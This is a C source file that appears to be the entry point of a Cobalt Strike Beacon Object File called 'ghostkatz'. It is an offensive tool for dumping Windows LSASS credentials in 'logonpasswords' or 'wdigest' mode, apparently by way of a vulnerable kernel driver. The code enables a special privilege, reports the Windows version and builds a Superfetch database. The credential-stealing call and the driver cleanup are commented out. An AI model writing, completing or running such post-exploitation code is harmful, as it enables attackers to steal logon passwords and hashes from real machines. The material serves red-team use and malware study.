#include "beacon.h"
#include "defs.h"
#include "ioctl.h"
#include "provider.h"
#include "ghostkatz.h"


#include "provider.c"
#include "utils.c"
#include "privileges.c"
#include "superfetch.c"
#include "lsass.c"
#include "eprocess.c"
#include "lsass_getkeys.c"
#include "lsass_logonpasswords.c"
#include "lsass_wdigest.c"

formatp outputbuffer;

int go(char *args, int argLen)
{
    datap parser;
	BeaconDataParse(&parser, args, argLen);
    int prvFlagLen = 0;
    int modeLen = 0;
    char* prvFlag = BeaconDataExtract(&parser, &prvFlagLen);
    if (BeaconDataLength(&parser) < (int)sizeof(int))
    {
        BeaconPrintf(CALLBACK_ERROR, "Missing arguments!");
        return FALSE;
    }
    int provider = BeaconDataInt(&parser);
    char* mode = BeaconDataExtract(&parser, &modeLen);

    if (!mode || modeLen <= 0 || mode[0] == '\0')
    {
        BeaconPrintf(CALLBACK_ERROR, "Missing arguments!");
        return FALSE;
    }

    if (prvFlag && prvFlag[0] != '\0')
    {
        if (strcmp(prvFlag, "-prv") != 0)
        {
            BeaconPrintf(CALLBACK_ERROR, "Invalid argument %s", prvFlag);
            return FALSE;
        }
    }

    if (BeaconDataLength(&parser) != 0)
    {
        BeaconPrintf(CALLBACK_ERROR, "Invalid number of arguments!");
        return FALSE;
    }

    if ( (strcmp(mode, "logonpasswords") != 0) && (strcmp(mode, "wdigest") != 0) )
    {
        BeaconPrintf(CALLBACK_ERROR, "Invalid argument!");
        return FALSE;
    }

    // We can create buffer now that the initial checks have passed
    BeaconFormatAlloc(&outputbuffer, 4096);

    BOOL bResult = EnablePrivilege(SE_PROF_SINGLE_PROCESS_PRIVILEGE);
    if (!bResult) 
    {
        BeaconFormatPrintf(&outputbuffer, "Failed to enable privilege! Error code: %llx\n", GetLastError());
        BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&outputbuffer, NULL));
        BeaconFormatFree(&outputbuffer);
        return FALSE;
    }
    BeaconFormatPrintf(&outputbuffer, "[+] Enabled SE_PROF_SINGLE_PROCESS_PRIVILEGE\n");

    PROVIDER_INFO* prov_info = GetProviderInfo(provider);
    if (prov_info == NULL)
    {
        BeaconPrintf(CALLBACK_ERROR, "Invalid provider ID: %d", provider);
        return FALSE;
    }
    else
    {
        BeaconFormatPrintf(&outputbuffer, "[INFO] Provider: %s\n", prov_info->service_name);
    }

    isServiceInstalled(provider);
    //return FALSE;

    char* WindowsVersion = GetWinVersion();
    BeaconFormatPrintf(&outputbuffer, "[+] Windows Version: %s\n", WindowsVersion);

    char* WindowsBuild = GetWinBuildNumber();
    BeaconFormatPrintf(&outputbuffer, "[+] Windows Build Number: %s\n", WindowsBuild);


    if (!CreateGlobalSuperfetchDatabase())
    {
        BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&outputbuffer, NULL));
        BeaconFormatFree(&outputbuffer);
        return FALSE;
    }


    //StealLSASSCredentials(hFile, WindowsVersion);

    
    // Stop and delete service

    //BeaconFormatPrintf(&outputbuffer, "[+] Closing handle to vulnerable driver\n");
    //CloseHandle(hFile);

    BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&outputbuffer, NULL));
    BeaconFormatFree(&outputbuffer);
    
}
